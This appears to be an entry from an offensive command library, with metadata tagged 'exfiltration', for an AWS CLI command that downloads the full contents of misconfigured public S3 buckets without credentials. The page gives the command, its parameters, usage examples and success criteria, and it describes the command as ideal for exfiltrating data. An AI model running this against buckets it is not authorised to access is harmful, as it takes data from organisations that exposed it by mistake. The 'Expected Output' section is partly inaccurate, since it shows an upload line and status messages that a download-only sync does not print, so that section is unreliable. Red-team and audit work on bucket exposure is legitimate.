---
id: 084f9b11-43a4-4a6c-9f65-2c072b86046b
name: aws-s3-sync-bucket-to-local
type: command
executor: bash
data: 'aws s3 sync s3://$_BUCKET_NAME/ . --no-sign-request --region $_REGION'
output: null
created_at: '2023-04-06T03:55:52.816078+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - aws
  - s3
  - exfiltration
verified: true
validated: true
---

# aws-s3-sync-bucket-to-local

## Command

```bash
aws s3 sync s3://$_BUCKET_NAME/ . --no-sign-request --region $_REGION
```

## Description

This command uses the AWS CLI to synchronize (download) all objects from a specified S3 bucket to the local current directory, bypassing authentication for publicly accessible buckets. It is ideal for exfiltrating data from misconfigured storage in cloud environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_BUCKET_NAME | The name of the target S3 bucket (e.g., my-open-bucket) | Yes |
| $_REGION | The AWS region of the bucket (e.g., us-west-2, us-east-1) | Yes |
| --no-sign-request | Allows access without AWS credentials; fails if bucket requires auth | Built-in |
| s3://$_BUCKET_NAME/ | Source URI for the bucket root | Built-in |
| . | Destination local directory (current dir; can be changed to a path) | Built-in |

## Examples

### Basic Usage

```bash
aws s3 sync s3://example-public-bucket/ ./downloads/ --no-sign-request --region us-east-1
```

Downloads all files to a 'downloads' folder.

### Advanced Usage

```bash
aws s3 sync s3://$_BUCKET_NAME/ . --no-sign-request --region $_REGION --exclude '*' --include '*.txt'
```

Downloads only .txt files, excluding others.

## Expected Output

The command outputs progress for each file:

```
download: s3://bucket/file1.txt to file1.txt
upload: ./localfile.txt to s3://bucket/localfile.txt  (skipped if no uploads)
Completed 1 part(s) with ... file(s) remaining
```

Success is indicated by 'Completed' with transferred bytes >0 and no 'AccessDenied' errors. For empty buckets: 'No applicable objects identified'.

## Related

- [[procedures/Download-All-Files-from-Misconfigured-S3-Bucket]]
- [[tools/AWS-CLI]]
